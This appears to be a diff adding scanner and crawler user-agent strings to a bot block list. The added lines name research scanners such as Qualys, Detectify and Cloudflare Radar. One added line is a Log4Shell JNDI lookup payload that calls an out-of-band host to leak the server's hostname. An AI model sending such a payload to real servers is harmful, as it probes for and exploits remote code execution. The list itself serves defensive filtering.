@@ -3794,3 +3794,37 @@ NYU Internet Census (https://scan.lol; research@scan.lol)
 Download Demon/3.5.0.11
 webbandit/4.xx.0
 Mozilla/5.0 (compatible; +centuryb.o.t9[at]gmail.com)
+${jndi:ldap://${hostName}.useragent.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.oast.fun}
+abuse.xmco.fr
+Arachni/v1.5.1
+Bilbo/2.3b-UNIX
+bitdiscovery-suggestions
+Cloudflare-Radar-Scanner
+cyberscan.io
+cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36
+DomainDrift/0.3 (Internet Telemetry; +https://domaindrift.io)
+fhms-its-research-scanner/1.0 (+https://fb02itsscan02.fh-muenster.de)
+https://researchcyber.net/
+InfoGuardDisclosureResearch/1.0 (https://www.infoguard.ch; +mailto:redteam@infoguard.ch) security.txt-discovery
+l9explore/1.2.2
+l9explore/1.3.0
+Mozilla/5.0 (compatible; CloudflareRadarURLScanner; +https://radar.cloudflare.com/)
+Mozilla/5.0 (compatible; CMSLookup/1.0)
+Mozilla/5.0 (compatible; CSE-Scanner/1.0)
+Mozilla/5.0 (compatible; Detectify)
+Mozilla/5.0 (compatible; FreePBX-Scanner/1.0)
+Mozilla/5.0 (compatible; NetScope-DomainScanner/1.0; security research scanner)
+Mozilla/5.0 (compatible; Qualys; +https://www.qualys.com/)
+Mozilla/5.0 (compatible; SecurityScanner/1.0)
+Mozilla/5.0 (compatible; SnoopSecInspect/1.1; +https://snoopsec.us.to/)
+Mozilla/5.0 (compatible; UGAResearchAgent/1.0; Please visit: NISLabUGA.github.io)
+Mozilla/5.0 (compatible; wp2shell-check/1.0)
+Mozilla/5.0 (compatible;vu-server-health-scanner/1.0;https://130.37.198.75/index.html)
+Mozilla/5.0 (Exchange check)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 (scanner.ducks.party)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 SecurityHeaders
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3122.113 Safari/537.36 Assetnote/1.0.0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 (https://securitee.org/cms-experiment-fall2024/)
+RootEvidence/1.0
+TLM-Audit-Scanner/1.0
+TwinWaveScanner
